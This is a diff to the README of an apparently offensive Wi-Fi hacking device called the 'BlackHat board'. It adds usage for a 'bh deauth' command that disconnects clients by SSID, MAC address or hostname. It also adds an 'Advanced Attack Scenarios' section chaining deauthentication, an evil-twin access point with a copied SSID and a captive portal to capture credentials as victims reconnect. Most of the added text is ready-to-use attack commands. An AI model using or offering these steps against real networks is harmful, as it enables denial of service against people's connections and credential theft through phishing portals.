@@ -53,6 +53,36 @@ Deploys a captive portal that intercepts and captures user credentials. The port
 - `index2.html` - Secondary portal page  
 - `index3.html` - Tertiary portal page
 
+### Deauthentication Attacks
+```bash
+bh deauth <target>              # Disconnect clients from networks
+```
+
+**Target Types:**
+- **SSID Name**: Disconnects all clients from specified network (must be connected to that network)
+  ```bash
+  bh deauth "HomeWiFi_5G"       # Disconnect all clients from HomeWiFi_5G
+  ```
+- **MAC Address**: Disconnects specific device by MAC address
+  ```bash
+  bh deauth aa:bb:cc:dd:ee:ff   # Disconnect specific device
+  ```
+- **Hostname**: Disconnects device by hostname (must be on same network as BlackHat board)
+  ```bash
+  bh deauth laptop-john         # Disconnect John's laptop
+  ```
+
+**Technical Details:**
+- Automatically uses appropriate interface (prefers 5GHz USB dongle for monitor mode)
+- Sends configurable number of deauth frames (default: 10)
+- Supports both 2.4GHz and 5GHz networks
+- Can target specific clients or entire networks
+
+**Limitations:**
+- Hostname resolution only works for devices on the same network you're connected to
+- For external networks, must use MAC addresses obtained from scanning
+- Some modern devices may reconnect quickly after deauth
+
 ## Monitoring & Intelligence
 
 ### Packet Capture
@@ -125,12 +155,36 @@ bh set AP_SSID "TargetNetwork"
 bh evil_twin
 ```
 
-### 3. Credential Harvesting
+### 3. Deauthentication Attacks
+```bash
+# Disconnect all clients from target network (if connected)
+bh deauth "TargetNetwork"
+
+# Disconnect specific device
+bh deauth aa:bb:cc:dd:ee:ff
+
+# Disconnect device by hostname (same network)
+bh deauth laptop-victim
+```
+
+### 4. Credential Harvesting
 ```bash
 # Deploy captive portal
 bh evil_portal
 
 # Monitor captured credentials in logs
+```
+
+### 5. Advanced Attack Scenarios
+```bash
+# Deauth + Evil Twin combination
+bh deauth "LegitNetwork"        # Force disconnect clients
+bh set AP_SSID "LegitNetwork"   # Create fake AP with same name
+bh evil_portal                  # Capture credentials when clients reconnect
+
+# Targeted deauth for specific user
+bh deauth john-laptop           # Disconnect specific user
+bh kismet wlan1                 # Monitor for reconnection attempts
 ```
 
 ## Security Considerations
